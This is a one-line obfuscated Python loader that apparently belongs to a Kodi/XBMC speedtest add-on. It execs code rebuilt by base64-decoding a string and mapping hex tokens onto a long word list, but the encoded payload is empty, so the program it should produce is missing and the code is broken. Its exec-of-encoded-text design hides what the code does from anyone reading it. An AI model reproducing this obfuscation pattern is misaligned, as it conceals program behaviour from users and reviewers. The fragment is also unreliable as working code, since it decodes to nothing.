exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|1|2|3|4|5|6|SpeedtestCliServerListError|8|9|a|getAttributesByTagName|c|d|e|f|10|11|from|prod_thread|None|15|user_agent|configuration|try|append|build_request|if|def|client|want_unicode|attrib|1000|result|headers|latency|results|25|url|timeit|download|root|finished|serversxml|update|Thread|best|2f|isinstance|not|for|timeout|math|units|36|configxml|encode|upload|join|catch_request|sys|s|False|Testing|ulspeed|resultid|config|raise|HTTPSConnection|speedtest|HTTPConnection|isAlive|kwargs|socket|getElementsByTagName|urlparse|close|to|args|urlparts|size|URLError|Retrieving|and|in|http|HTTPError|starttime|int|Exception|0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ|break|urlopen|write|closest|unicode|import|the|schemed_url|uploadSpeed|end|65|consumer|list|else|parse_qs|producer|True|build_user_agent|platform|distance|__init__|elements|source|class|SystemExit|len|scheme|stdout|FilePutter|del|global|Python|FileGetter|closestServers|dlspeed|radians|minidom|exit|sep|TypeError|dp|socket_socket|uh|downloadSpeed|getBestServer|round|files|Queue|speed|continue|dlspeedk|target|cElementTree|builtins|string|simple|ulspeedk|xml|95|retrieve|exc_info|read|ElementTree|destination|nCancelling|total_files|SyntaxError|total_sizes|parseString|Request|version|newline|fastest|etree|urls|retrieving|times|code|e_http_py3|quiet|e_http_py2|fromstring|Could|parse|ping|Agent|float|isSet|attributes|is|return|recommendedserverid|errors|SpeedTest|as|dom|Determine|www|ignore|be|php|sizesizes|submit|Selecting|python|calculate|curserver|ArgParser|urllib|KeyboardInterrupt|setdefaulttimeout|User|test|Function|ua_tuple|response|Download|ET|find|print|get|range|10240|bound_interface|space|based|DOM|Build|cum|urllib2|threads|AttributeError|Python3|Mozilla|DialogProgress|xbmcgui|apiData|ArgumentParser|tagName|q|python_version|IOError|dirname|automatically|start|with|file|dlat|sorted|except|200|speeds|lat2|lat1|architecture|while|Upload|installation|establishing|launch|bound_socket|branch|OptionParser|md5|sin|name|dlon|dict|qsargs|arg|sock|sum|origin|Failed|str|static|used|radius|getresponse|getiterator|server|encountered|consistent|connection|pingselect|basestring|error|exceptions|geographic|https|flush|km|parameters|xbmcplugin|share|which|total|operations|compatible|items|chars|interested|i|uploadfail|lon|hexdigest|pop|startmode|URL|arguments|specified|attribute|all|xbmcaddon|lat|determine|enumerate|utf|variables|requests|argparse|os|of|on|required|elem|document|threaded|keys|297aae72|location|text|content1|sqrt|serverid|indicate|main|elif|sequence|optparse|Starting|threading|Internal|Retrieve|pypi|accuracy|versions|HTTP|__main__|lon2|lon1|path|n|__name__|3600|only|must|Referer|getattr|instead|details|Perform|default_timer|sponsor|putting|between|Attempt|certain|expects|because|keyword|hashlib|missing|classes|address|invalid|httplib|Getting|random|Helper|png|create|or|set|api|avg|header|system|object|run|put|decode|isp|Server|ms|likely|fp|ctrl_c|lowest|format|Wizard|Cannot|cos|servers|signal|use|Hosted|signum|common|getConfig|handle|status|older|taken|Gecko|frame|fetch|h|style|Catch|Event|KHTML|shutdown_event|order|agent|thread|HTTPS|Share|flash|promo|Begin|self|cache|Print|ImportError|queue|catch|atan2|next|like|__version__|This|an|bind|Used|mini|Ctrl|back|Some|sets|game|4000|6371|3000|Only|we|Bind|were|Ares|2500|data|move|full|adds|than|xbmc|able|hash|3500|2000|pass|when|id|send|1500|Your|ip|user|We|src|r|M|Pre|Run|has|swf|new|cli|bit|key|XML|our|cgi|txt|six|750|are|GET|350|Net|The|org|500|API|jpg|print_|sizes|function|us|cons_thread|re|it|net|sx|en|request|IP|by|U|C".split("|")))